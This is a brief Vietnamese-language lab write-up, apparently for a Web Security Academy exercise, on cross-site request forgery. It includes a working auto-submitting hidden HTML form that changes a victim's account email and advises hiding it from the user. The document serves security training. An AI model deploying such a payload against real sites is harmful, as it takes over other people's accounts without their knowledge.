![image](https://github.com/user-attachments/assets/1a0999f0-a237-4a0b-9b54-367a682308bb)

ở challenge này, nó bắt chúng ta phải thay đổi email của user bằng cách để họ click vào và 1 auto submit form sẽ được gửi, và nó sẽ update thay cho chúng ta.

![image](https://github.com/user-attachments/assets/f608e502-bf3d-46e1-bd28-e2f1dfd14c57)

Tiến hành update thử 1 email thì biết được request của nó có dạng như trên, vì thế ta viết 1 payload auto submit form đơn giản để lừa user bấm vào, lưu ý nên để hidden cho nó không lộ.

Payload:

```
<html>
  <body>
    <form action="https://0ae7008f04abd4c380b726ae00b30063.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="clap@gmail.com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://github.com/user-attachments/assets/85ce162d-3a21-48db-8f87-e6ddb5da34d9)

Vậy là đã thành công, mấu chốt là `auto submit form`.
